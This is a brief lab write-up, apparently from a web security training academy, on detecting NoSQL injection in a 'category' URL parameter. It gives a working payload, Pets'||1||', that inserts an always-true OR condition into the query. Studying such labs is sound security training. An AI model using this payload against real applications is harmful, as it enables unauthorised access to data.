Title: Detecting NoSQL injection

We control the value of the category parameter:
https://0a5500b80422cc1580712142004b0017.web-security-academy.net/filter?category=we_control_this

Successful payload is with `||` characters, which mean OR statement,
`1` is always true

https://0a5500b80422cc1580712142004b0017.web-security-academy.net/filter?category=Pets%27||1||%27

![image](https://github.com/user-attachments/assets/492be004-85d1-4176-bb15-b9475dedab67)
